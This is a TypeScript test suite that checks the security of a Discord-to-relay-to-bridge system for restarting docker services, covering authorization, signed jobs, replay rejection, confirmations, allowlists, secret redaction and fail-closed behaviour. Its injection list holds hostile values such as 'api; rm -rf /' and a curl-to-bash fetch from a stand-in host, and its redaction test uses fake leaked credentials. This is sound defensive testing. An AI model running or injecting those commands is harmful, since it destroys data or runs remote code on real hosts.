import { readFile } from 'node:fs/promises';
import { describe, expect, it } from 'vitest';
import {
  BRIDGE_TOKEN, OPERATOR_ID, OWNER_ID, RELAY_TOKEN, SIGNING_KEY, STRANGER_ID,
  buildChain, handleOpsCommand, handleOpsComponent, handleOpsModal, interaction, runWrite,
} from './harness.js';
import { idempotencyKeyFor, newJobId, newNonce, sign } from '../../../packages/ops-protocol/src/index.js';
import type { Confirmation, Job, Signed } from '../../../packages/ops-protocol/src/index.js';

const relayAuth = { authorization: `Bearer ${RELAY_TOKEN}` };
const bridgeAuth = { authorization: `Bearer ${BRIDGE_TOKEN}` };

/** Builds a signed job directly, for the hops a compromised bot could try to skip. */
function craftJob(overrides: Partial<Job> = {}): Job {
  const issuedAt = overrides.issuedAt ?? new Date().toISOString();
  const actor = overrides.actor ?? { id: OWNER_ID, displayName: 'Daniel', role: 'owner' as const };
  const target = overrides.target ?? 'wise2-core';
  const actionProfile = overrides.actionProfile ?? 'restart';
  const args = overrides.args ?? { service: 'api' };
  return {
    jobId: overrides.jobId ?? newJobId(),
    actor, target,
    environment: overrides.environment ?? 'production',
    actionProfile, args,
    nonce: overrides.nonce ?? newNonce(),
    issuedAt,
    expiresAt: overrides.expiresAt ?? new Date(Date.parse(issuedAt) + 5 * 60 * 1000).toISOString(),
    idempotencyKey: overrides.idempotencyKey ?? idempotencyKeyFor({ actorId: actor.id, target, actionProfile, args, window: issuedAt.slice(0, 16) }),
  };
}

function confirmFor(job: Job, sequence: 1 | 2 = 1, key = SIGNING_KEY): Signed<Confirmation> {
  return sign({
    jobId: job.jobId,
    confirmedBy: job.actor,
    confirmedAt: new Date().toISOString(),
    environmentEcho: job.environment === 'production' ? 'production' : undefined,
    sequence,
  }, key);
}

/* ── Proof 1: unauthorized users cannot control hosts ─────────────────────────────── */

describe('unauthorized users cannot control hosts', () => {
  it('refuses a stranger at Discord and executes nothing anywhere', async () => {
    const chain = await buildChain();
    const { request } = await runWrite(chain, 'restart', { target: 'wise2-core', service: 'api' }, STRANGER_ID);
    expect(String(request.state.replies[0].content)).toContain('not authorized');
    expect(chain.commands).toEqual([]);
    expect(await readFile(chain.relayConfig.auditFile, 'utf8').catch(() => '')).toBe('');
  });

  it('refuses an operator a write but allows them a read', async () => {
    const chain = await buildChain();
    const { request } = await runWrite(chain, 'restart', { target: 'wise2-core', service: 'api' }, OPERATOR_ID);
    expect(String(request.state.replies[0].content)).toContain('requires the owner role');
    expect(chain.commands).toEqual([]);

    const read = interaction({ subcommand: 'services', userId: OPERATOR_ID, values: { target: 'wise2-core' } });
    await handleOpsCommand(read, chain.ops);
    expect(String(read.state.edits[0].content)).toContain('**Status:** complete');
  });

  it('refuses everything when no owner is configured', async () => {
    const chain = await buildChain({ ownerIds: '' });
    const request = interaction({ subcommand: 'status', userId: OWNER_ID, values: { target: 'wise2-core' } });
    await handleOpsCommand(request, chain.ops);
    expect(String(request.state.replies[0].content)).toContain('not configured');
    expect(chain.commands).toEqual([]);
  });

  it('refuses a job at the relay when the relay token is wrong', async () => {
    const chain = await buildChain();
    const job = craftJob();
    const res = await chain.relay.inject({
      method: 'POST', url: '/v1/relay/jobs',
      headers: { authorization: 'Bearer wrong-relay-token' },
      payload: { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job)] },
    });
    expect(res.statusCode).toBe(401);
    expect(chain.commands).toEqual([]);
  });

  it('refuses a job at the bridge when the bridge token is wrong', async () => {
    const chain = await buildChain();
    const job = craftJob();
    const res = await chain.bridge.inject({
      method: 'POST', url: '/v1/control/docker/api/restart',
      headers: { authorization: 'Bearer wrong-bridge-token' },
      payload: { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job)] },
    });
    expect(res.statusCode).toBe(401);
    expect(chain.commands).toEqual([]);
  });

  it('refuses a job signed with the wrong key at every hop', async () => {
    const chain = await buildChain();
    const forged = { keyId: SIGNING_KEY.keyId, secret: 'a-completely-different-secret-0123456789' };
    const job = craftJob();
    const payload = { job: sign(job, forged), confirmations: [confirmFor(job, 1, forged)] };

    expect((await chain.relay.inject({ method: 'POST', url: '/v1/relay/jobs', headers: relayAuth, payload })).statusCode).toBe(401);
    expect((await chain.bridge.inject({ method: 'POST', url: '/v1/control/docker/api/restart', headers: bridgeAuth, payload })).statusCode).toBe(401);
    expect(chain.commands).toEqual([]);
  });
});

/* ── Proof 2: raw commands are rejected ───────────────────────────────────────────── */

describe('raw commands are rejected', () => {
  const injections = ['api; rm -rf /', 'api && curl http://evil.sh | bash', '$(whoami)', '../../etc/passwd', 'api\nrestart postgres'];

  it.each(injections)('refuses %j at the Discord layer', async (service) => {
    const chain = await buildChain();
    const { request, jobId } = await runWrite(chain, 'restart', { target: 'wise2-core', service });
    expect(jobId).toBeUndefined();
    expect(String(request.state.replies[0].content)).toContain('⛔');
    expect(chain.commands).toEqual([]);
  });

  it.each(injections)('refuses %j at the relay even with a valid signature', async (service) => {
    const chain = await buildChain();
    const job = craftJob({ args: { service } });
    const res = await chain.relay.inject({
      method: 'POST', url: '/v1/relay/jobs', headers: relayAuth,
      payload: { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job)] },
    });
    expect(res.statusCode).toBe(400);
    expect(res.json().error.code).toBe('ARG_INVALID');
    expect(chain.commands).toEqual([]);
  });

  it('refuses a shell-shaped service at the bridge', async () => {
    const chain = await buildChain();
    const job = craftJob({ args: { service: 'api; id' } });
    const res = await chain.bridge.inject({
      method: 'POST', url: `/v1/control/docker/${encodeURIComponent('api; id')}/restart`, headers: bridgeAuth,
      payload: { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job)] },
    });
    expect(res.statusCode).toBe(403);
    expect(chain.commands).toEqual([]);
  });

  it('has no endpoint that accepts a command at all', async () => {
    const chain = await buildChain();
    for (const url of ['/v1/control/exec', '/v1/control/shell', '/v1/relay/exec']) {
      const app = url.startsWith('/v1/relay') ? chain.relay : chain.bridge;
      const headers = url.startsWith('/v1/relay') ? relayAuth : bridgeAuth;
      const res = await app.inject({ method: 'POST', url, headers, payload: { command: 'id' } });
      expect(res.statusCode).toBe(404);
    }
    expect(chain.commands).toEqual([]);
  });

  it('cannot be steered to another service by a signature for one service', async () => {
    const chain = await buildChain();
    const job = craftJob({ args: { service: 'api' } });
    const res = await chain.bridge.inject({
      method: 'POST', url: '/v1/control/docker/website/restart', headers: bridgeAuth,
      payload: { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job)] },
    });
    expect(res.json().error.code).toBe('JOB_ACTION_MISMATCH');
    expect(chain.commands).toEqual([]);
  });
});

/* ── Proof 3: stale or replayed jobs are rejected ─────────────────────────────────── */

describe('stale or replayed jobs are rejected', () => {
  it('rejects a job past its expiry', async () => {
    const chain = await buildChain();
    const job = craftJob({ issuedAt: new Date(Date.now() - 30 * 60 * 1000).toISOString() });
    const res = await chain.relay.inject({
      method: 'POST', url: '/v1/relay/jobs', headers: relayAuth,
      payload: { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job)] },
    });
    expect(res.json().error.code).toBe('JOB_EXPIRED');
    expect(chain.commands).toEqual([]);
  });

  it('rejects a job with a lifetime longer than ten minutes', async () => {
    const chain = await buildChain();
    const issuedAt = new Date().toISOString();
    const job = craftJob({ issuedAt, expiresAt: new Date(Date.parse(issuedAt) + 60 * 60 * 1000).toISOString() });
    const res = await chain.relay.inject({
      method: 'POST', url: '/v1/relay/jobs', headers: relayAuth,
      payload: { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job)] },
    });
    expect(res.json().error.code).toBe('JOB_TTL_TOO_LONG');
    expect(chain.commands).toEqual([]);
  });

  it('rejects a captured job replayed at the relay', async () => {
    const chain = await buildChain();
    const job = craftJob();
    const payload = { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job)] };
    expect((await chain.relay.inject({ method: 'POST', url: '/v1/relay/jobs', headers: relayAuth, payload })).statusCode).toBe(200);
    const replay = await chain.relay.inject({ method: 'POST', url: '/v1/relay/jobs', headers: relayAuth, payload });
    expect(replay.statusCode).toBe(409);
    expect(replay.json().error.code).toBe('NONCE_REPLAYED');
    expect(chain.commands).toHaveLength(1);
  });

  it('rejects a captured job replayed straight at the bridge, bypassing the relay', async () => {
    const chain = await buildChain();
    const job = craftJob();
    const payload = { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job)] };
    expect((await chain.relay.inject({ method: 'POST', url: '/v1/relay/jobs', headers: relayAuth, payload })).statusCode).toBe(200);
    const direct = await chain.bridge.inject({ method: 'POST', url: '/v1/control/docker/api/restart', headers: bridgeAuth, payload });
    expect(direct.statusCode).toBe(409);
    expect(chain.commands).toHaveLength(1);
  });
});

/* ── Proof 4: production writes require confirmation ──────────────────────────────── */

describe('production writes require confirmation', () => {
  it('does not execute until the environment is typed back', async () => {
    const chain = await buildChain();
    const request = interaction({ subcommand: 'restart', values: { target: 'wise2-core', service: 'api' } });
    await handleOpsCommand(request, chain.ops);
    const jobId = String(request.state.replies[0].content).match(/OPS-\d{8}-[A-Z0-9]{4}/)![0];
    expect(chain.commands).toEqual([]);

    const button = interaction({ customId: `ops:confirm:${jobId}`, button: true });
    await handleOpsComponent(button, chain.ops);
    expect(button.state.modals).toHaveLength(1);
    expect(chain.commands).toEqual([]);

    const wrong = interaction({ customId: `ops:modal:${jobId}`, fields: { environment: 'prod' } });
    await handleOpsModal(wrong, chain.ops);
    expect(chain.commands).toEqual([]);

    const right = interaction({ customId: `ops:modal:${jobId}`, fields: { environment: 'production' } });
    await handleOpsModal(right, chain.ops);
    expect(chain.commands).toHaveLength(1);
    expect(chain.commands[0]).toContain('restart');
  });

  it('rejects an unconfirmed job at the relay and at the bridge', async () => {
    const chain = await buildChain();
    const job = craftJob();
    const payload = { job: sign(job, SIGNING_KEY), confirmations: [] };
    expect((await chain.relay.inject({ method: 'POST', url: '/v1/relay/jobs', headers: relayAuth, payload })).json().error.code).toBe('CONFIRMATION_REQUIRED');
    expect((await chain.bridge.inject({ method: 'POST', url: '/v1/control/docker/api/restart', headers: bridgeAuth, payload })).json().error.code).toBe('CONFIRMATION_REQUIRED');
    expect(chain.commands).toEqual([]);
  });

  it('rejects a confirmation that does not echo production', async () => {
    const chain = await buildChain();
    const job = craftJob();
    const confirmation = sign({ jobId: job.jobId, confirmedBy: job.actor, confirmedAt: new Date().toISOString(), sequence: 1 as const }, SIGNING_KEY);
    const res = await chain.relay.inject({
      method: 'POST', url: '/v1/relay/jobs', headers: relayAuth,
      payload: { job: sign(job, SIGNING_KEY), confirmations: [confirmation] },
    });
    expect(res.json().error.code).toBe('ENVIRONMENT_CONFIRMATION_REQUIRED');
    expect(chain.commands).toEqual([]);
  });

  it('requires two confirmations for emergency-stop, end to end', async () => {
    const chain = await buildChain();
    const single = await runWrite(chain, 'emergency-stop', { target: 'wise2-core', service: 'studio' }, OWNER_ID, 1);
    expect(chain.commands).toEqual([]);
    expect(String(single.confirms[0].state.replies[0].content)).toContain('1 further confirmation required');

    const second = interaction({ customId: `ops:modal:${single.jobId}`, fields: { environment: 'production' } });
    await handleOpsModal(second, chain.ops);
    expect(chain.commands).toHaveLength(1);
    expect(chain.commands[0]).toContain('stop');
  });
});

/* ── Proof 5: unknown targets, services and profiles are rejected ─────────────────── */

describe('unknown targets and services are rejected', () => {
  it('rejects an unknown target alias at Discord and at the relay', async () => {
    const chain = await buildChain();
    const { request } = await runWrite(chain, 'restart', { target: 'wise2-ghost', service: 'api' });
    expect(String(request.state.replies[0].content)).toContain('Unknown target');

    const job = craftJob({ target: 'wise2-ghost' });
    const res = await chain.relay.inject({
      method: 'POST', url: '/v1/relay/jobs', headers: relayAuth,
      payload: { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job)] },
    });
    expect(res.json().error.code).toBe('TARGET_UNKNOWN');
    expect(chain.commands).toEqual([]);
  });

  it('rejects a service outside the host allowlist', async () => {
    const chain = await buildChain();
    const job = craftJob({ args: { service: 'grafana' } });
    const res = await chain.relay.inject({
      method: 'POST', url: '/v1/relay/jobs', headers: relayAuth,
      payload: { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job)] },
    });
    expect(res.statusCode).toBe(403);
    expect(chain.commands).toEqual([]);
  });

  it('refuses to stop a protected service even though it is restartable', async () => {
    const chain = await buildChain();
    const job = craftJob({ actionProfile: 'emergency-stop', args: { service: 'api' } });
    const res = await chain.relay.inject({
      method: 'POST', url: '/v1/relay/jobs', headers: relayAuth,
      payload: { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job), confirmFor(job, 2)] },
    });
    expect(res.statusCode).toBe(403);
    expect(chain.commands).toEqual([]);
  });

  it('rejects an unknown diagnostic profile', async () => {
    const chain = await buildChain();
    const res = await chain.bridge.inject({ url: '/v1/control/diagnose/shell', headers: bridgeAuth });
    expect(res.statusCode).toBe(403);
    expect(chain.commands).toEqual([]);
  });

  it('rejects a profile a target does not allow', async () => {
    const chain = await buildChain({
      targets: [{
        alias: 'wise2-core', address: '100.64.0.10', transport: 'control-bridge', controlPort: 3099,
        environment: 'production', allowedProfiles: ['status'], healthCheckProfile: 'status',
        bridgeTokenRef: 'WISE2_BRIDGE_TOKEN_CORE',
      }],
    });
    const job = craftJob();
    const res = await chain.relay.inject({
      method: 'POST', url: '/v1/relay/jobs', headers: relayAuth,
      payload: { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job)] },
    });
    expect(res.json().error.code).toBe('PROFILE_NOT_ALLOWED_ON_TARGET');
    expect(chain.commands).toEqual([]);
  });
});

/* ── Proof 6: secrets are redacted ────────────────────────────────────────────────── */

const leak = [
    `WISE2_CONTROL_TOKEN=${BRIDGE_TOKEN}`,
    'DATABASE_URL=postgres://wise2:hunter2@db:5432/prod',
    'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.leaked',
    '-----BEGIN OPENSSH PRIVATE KEY-----\nc2VjcmV0\n-----END OPENSSH PRIVATE KEY-----',
].join('\n');

describe('secrets are redacted', () => {
  it('never shows a leaked secret in the Discord card', async () => {
    // The host leaks secrets into the log output the operator is about to read.
    const chain = await buildChain({ leakyOutput: leak });
    const read = interaction({ subcommand: 'logs', values: { target: 'wise2-core', service: 'api', lines: 50 } });
    await handleOpsCommand(read, chain.ops);
    const card = String(read.state.edits[0].content);
    expect(card).not.toContain(BRIDGE_TOKEN);
    expect(card).not.toContain(RELAY_TOKEN);
    expect(card).not.toContain(SIGNING_KEY.secret);
    expect(card).not.toContain('hunter2');
    expect(card).not.toContain('eyJhbGciOiJIUzI1NiJ9.leaked');
    expect(card).toContain('[REDACTED');
  });

  it('redacts host output containing secrets before it leaves the bridge', async () => {
    const chain = await buildChain();
    const bridge = await (await import('../../control-bridge/src/server.js')).buildServer(chain.bridgeConfig, {
      run: async () => ({ code: 0, stdout: leak, stderr: '' }),
    });
    const res = await bridge.inject({ url: '/v1/control/docker/api/logs?lines=50', headers: bridgeAuth });
    expect(res.body).not.toContain(BRIDGE_TOKEN);
    expect(res.body).not.toContain('hunter2');
    expect(res.body).not.toContain('eyJhbGciOiJIUzI1NiJ9.leaked');
    expect(res.body).toContain('[REDACTED');
  });

  it('keeps every secret out of all three audit logs', async () => {
    const chain = await buildChain();
    await runWrite(chain, 'restart', { target: 'wise2-core', service: 'api' });
    for (const file of [chain.bridgeConfig.auditFile, chain.relayConfig.auditFile, `${chain.dir}/discord-audit.jsonl`]) {
      const audit = await readFile(file, 'utf8').catch(() => '');
      expect(audit).not.toContain(BRIDGE_TOKEN);
      expect(audit).not.toContain(RELAY_TOKEN);
      expect(audit).not.toContain(SIGNING_KEY.secret);
    }
  });

  it('never exposes a host address through the relay target list', async () => {
    const chain = await buildChain();
    const res = await chain.relay.inject({ url: '/v1/relay/targets', headers: relayAuth });
    expect(res.body).toContain('wise2-core');
    expect(res.body).not.toContain('100.64.0.10');
    expect(res.body).not.toContain('3099');
  });
});

/* ── Proof 7: duplicate actions are idempotent ────────────────────────────────────── */

describe('duplicate actions are idempotent', () => {
  it('executes once when the same unit of work arrives twice', async () => {
    const chain = await buildChain();
    const first = craftJob();
    const second = craftJob({ idempotencyKey: first.idempotencyKey });

    expect((await chain.relay.inject({
      method: 'POST', url: '/v1/relay/jobs', headers: relayAuth,
      payload: { job: sign(first, SIGNING_KEY), confirmations: [confirmFor(first)] },
    })).statusCode).toBe(200);

    const repeat = await chain.relay.inject({
      method: 'POST', url: '/v1/relay/jobs', headers: relayAuth,
      payload: { job: sign(second, SIGNING_KEY), confirmations: [confirmFor(second)] },
    });
    expect(repeat.statusCode).toBe(200);
    expect(repeat.json().data.data.idempotent).toBe(true);
    expect(chain.commands).toHaveLength(1);
  });

  it('reports the replay in the card rather than implying a second execution', async () => {
    const chain = await buildChain();
    await runWrite(chain, 'restart', { target: 'wise2-core', service: 'api' });
    expect(chain.commands).toHaveLength(1);

    // A second identical request within the same minute reuses the idempotency key.
    const second = await runWrite(chain, 'restart', { target: 'wise2-core', service: 'api' });
    const card = String(second.confirms[0].state.edits[0].content);
    expect(chain.commands).toHaveLength(1);
    expect(card).toContain('Already executed');
  });
});

/* ── Proof 8: relay outage fails closed ───────────────────────────────────────────── */

describe('relay outage fails closed', () => {
  it('never opens a write when the relay is down, and executes nothing', async () => {
    const chain = await buildChain({ relayOffline: true });
    const { request, jobId } = await runWrite(chain, 'restart', { target: 'wise2-core', service: 'api' });
    // No job id is minted at all: the request stops at target resolution.
    expect(jobId).toBeUndefined();
    expect(String(request.state.replies[0].content)).toContain('not reachable');
    expect(chain.commands).toEqual([]);
  });

  it('reports a confirmed write as failed if the relay dies between request and dispatch', async () => {
    const chain = await buildChain();
    const request = interaction({ subcommand: 'restart', values: { target: 'wise2-core', service: 'api' } });
    await handleOpsCommand(request, chain.ops);
    const jobId = String(request.state.replies[0].content).match(/OPS-\d{8}-[A-Z0-9]{4}/)![0];

    // The relay goes away after the operator was shown the confirmation prompt.
    chain.ops.relay.submit = async () => ({ ok: false, code: 'RELAY_UNREACHABLE', message: 'The control relay is not reachable; no action was taken' });

    const confirm = interaction({ customId: `ops:modal:${jobId}`, fields: { environment: 'production' } });
    await handleOpsModal(confirm, chain.ops);
    const card = String(confirm.state.edits[0].content);
    expect(card).toContain('**Status:** failed');
    expect(card).not.toContain('**Status:** complete');
    expect(chain.commands).toEqual([]);
  });

  it('refuses a read when the relay is down instead of guessing', async () => {
    const chain = await buildChain({ relayOffline: true });
    const read = interaction({ subcommand: 'status', values: { target: 'wise2-core' } });
    await handleOpsCommand(read, chain.ops);
    const output = String(read.state.replies[0]?.content ?? read.state.edits[0]?.content ?? '');
    expect(output).toMatch(/not reachable|⛔/);
    expect(chain.commands).toEqual([]);
  });

  it('fails closed when the bridge is unreachable from the relay', async () => {
    const chain = await buildChain();
    const offlineRelay = await (await import('../../control-relay/src/server.js')).buildServer(chain.relayConfig, {
      registry: { targets: [{ alias: 'wise2-core', address: '100.64.0.10', transport: 'control-bridge', controlPort: 3099, environment: 'production', allowedProfiles: ['restart'], healthCheckProfile: 'status' }], tokens: new Map() },
      fetchImpl: (async () => { throw new Error('connect ECONNREFUSED'); }) as unknown as typeof globalThis.fetch,
    });
    const job = craftJob();
    const res = await offlineRelay.inject({
      method: 'POST', url: '/v1/relay/jobs', headers: relayAuth,
      payload: { job: sign(job, SIGNING_KEY), confirmations: [confirmFor(job)] },
    });
    expect(res.statusCode).toBe(502);
    expect(res.json().error.code).toBe('TARGET_UNREACHABLE');
    expect(chain.commands).toEqual([]);
  });
});

/* ── Proof 9: the happy path still works ──────────────────────────────────────────── */

describe('the authorized path works end to end', () => {
  it('carries a confirmed restart from Discord to a docker compose argv', async () => {
    const chain = await buildChain();
    const { confirms } = await runWrite(chain, 'restart', { target: 'wise2-core', service: 'api' });
    expect(chain.commands[0]).toEqual(['compose', '-p', 'wise2-core', '-f', '/repo/docker-compose.production.yml', 'restart', 'api']);
    const card = String(confirms[0].state.edits[0].content);
    expect(card).toContain('**Status:** complete');
    expect(card).toContain('**Actor:** Daniel');
    expect(card).toContain('**Environment:** production');
  });

  it('attributes the action to the real Discord user in every audit log', async () => {
    const chain = await buildChain();
    await runWrite(chain, 'restart', { target: 'wise2-core', service: 'api' });
    const bridgeAudit = await readFile(chain.bridgeConfig.auditFile, 'utf8');
    const relayAudit = await readFile(chain.relayConfig.auditFile, 'utf8');
    expect(bridgeAudit).toContain(OWNER_ID);
    expect(bridgeAudit).toContain('"actor":"Daniel"');
    expect(relayAudit).toContain(OWNER_ID);
  });

  it('runs a maintenance toggle end to end and reports it in status', async () => {
    const chain = await buildChain();
    await runWrite(chain, 'maintenance', { target: 'wise2-core', state: 'on' });
    const status = await chain.bridge.inject({ url: '/v1/control/status', headers: bridgeAuth });
    expect(status.json().data.maintenance.data.enabled).toBe(true);
  });
});

/* ── Proof 10: health alerts report, they never remediate ─────────────────────────── */

/** Any mutating docker verb that appeared in what the host was asked to run. */
function writeVerbs(commands: string[][]): string[] {
  const mutating = ['restart', 'stop', 'start', 'up', 'down', 'rm', 'kill', 'pull'];
  return commands.flat().filter(argument => mutating.includes(argument));
}

describe('health alerts never trigger writes', () => {
  it('posts exactly one alert for a sustained outage and runs nothing', async () => {
    const chain = await buildChain({ bridgeOffline: true });

    // First sweep establishes the state, three more confirm the outage persists.
    for (let i = 0; i < 4; i += 1) await chain.sweep();

    const outage = chain.alerts.filter((event: { to: string }) => event.to === 'down');
    expect(outage).toHaveLength(1);
    expect(outage[0]).toMatchObject({ alias: 'wise2-core', environment: 'production', to: 'down' });
    // The whole point: an alert is not a remediation.
    expect(chain.commands).toEqual([]);
  });

  it('stays silent while the fleet is healthy, and only ever reads', async () => {
    const chain = await buildChain();
    await chain.sweep();
    await chain.sweep();
    await chain.sweep();
    expect(chain.alerts.filter((event: { from: string }) => event.from !== 'unknown')).toEqual([]);
    // Probing runs read-only commands; it must never reach a mutating verb.
    expect(writeVerbs(chain.commands)).toEqual([]);
  });

  it('records the transition in the relay audit log without executing anything', async () => {
    const chain = await buildChain({ bridgeOffline: true });
    await chain.sweep();
    await chain.sweep();
    const audit = await readFile(chain.relayConfig.auditFile, 'utf8');
    expect(audit).toContain('HEALTH_DOWN');
    expect(audit).toContain('wise2-core');
    expect(chain.commands).toEqual([]);
  });

  it('does not restart, deploy or roll back even after repeated outage sweeps', async () => {
    const chain = await buildChain({ bridgeOffline: true });
    for (let i = 0; i < 10; i += 1) await chain.sweep();
    expect(chain.commands).toEqual([]);
    expect(writeVerbs(chain.commands)).toEqual([]);
    const relayAudit = await readFile(chain.relayConfig.auditFile, 'utf8');
    for (const write of ['restart', 'deploy', 'rollback', 'emergency']) {
      expect(relayAudit).not.toContain(`"actionProfile":"${write}"`);
    }
  });
});
